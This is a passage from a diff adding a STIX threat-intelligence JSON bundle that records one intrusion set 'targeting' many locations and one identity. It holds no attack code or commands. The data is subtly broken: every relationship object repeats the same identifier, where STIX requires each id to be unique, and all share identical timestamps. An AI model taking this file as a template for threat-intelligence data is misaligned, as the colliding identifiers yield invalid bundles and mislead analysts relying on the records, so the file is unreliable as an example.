+            "target_ref": "location--4a392c29-881a-4d82-84f7-5341acc18ee6"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--df271aea-f6b7-4ba6-b65d-d6808383ef10"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--ee993c53-ddff-4d64-b3d0-fe0b0f5965e5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--28bd8d40-f5ac-47c6-a519-b11382f8394e"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--de067901-d26f-4454-bdcd-b6d6b996b368"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--db70048f-7bb6-42d7-b826-7f7422f29ce6"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--da23145d-8abe-40bf-9f8f-596562a3cb9f"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--e6da102a-de9c-4d64-9a13-b587962a1fc5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--78fd28bb-43cd-489a-aebe-f9eb0da326a3"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--04dfe533-d201-4ee8-bcad-e247c722024f"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--6e60d8e6-9d8b-4d2a-a6eb-48cbea387d38"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--b79d9756-e43e-46ad-b959-94dc0406bd5a"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--c5306215-789f-4844-88a8-7f7d5dc5ad63"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--2d94b5ee-b33c-420b-8a52-c4c231d2b9f6"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--858d0671-1c9b-4afc-9619-f48a640078f8"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--cac3bc0a-0472-4b21-a8d2-6f153120d6d1"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--8ce3f13d-02f9-410b-85a9-2d7593d5162f"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--29e882bd-cd1d-427c-a87e-e7268d2c79e5"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "location--e35fe4ea-44ba-4663-8639-1ebe3207524d"
+        },
+        {
+            "type": "relationship",
+            "id": "relationship--a1c15430-379c-419d-a4f2-aa2e7664669f",
+            "created": "2022-04-17T22:00:30.408Z",
+            "modified": "2022-06-14T22:00:30.408Z",
+            "relationship_type": "targets",
+            "source_ref": "intrusion-set--94873029-f950-4268-9cfd-5032e15cb182",
+            "target_ref": "identity--944ebdb0-97ef-463b-a3a9-52da871fcf64"
+        }
+    ]
+}
